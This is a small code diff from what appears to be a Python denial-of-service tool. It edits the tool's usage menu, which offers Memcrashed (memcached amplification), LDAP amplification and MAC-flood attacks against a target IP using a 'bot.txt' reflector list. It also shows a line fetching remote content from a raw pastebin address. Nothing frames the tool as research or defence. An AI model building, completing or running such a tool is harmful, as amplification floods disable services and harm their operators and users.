@@ -49,7 +49,7 @@ print("""
 
 1. Memcrashed: -A 1 -T xx.xx.xx.xx -S bot.txt -N 40
 2. LDAP: -A 2 -T xx.xx.xx.xx -S bot.txt -N 40
-3. Mac-flood: -A 3 -N xx.xx.xx.xx 
+3. Mac-flood: -A 3 -T xx.xx.xx.xx -N 40
 
 	""")
 req = urllib2.urlopen('https://pastebin.com/raw/eSCHTTVu')
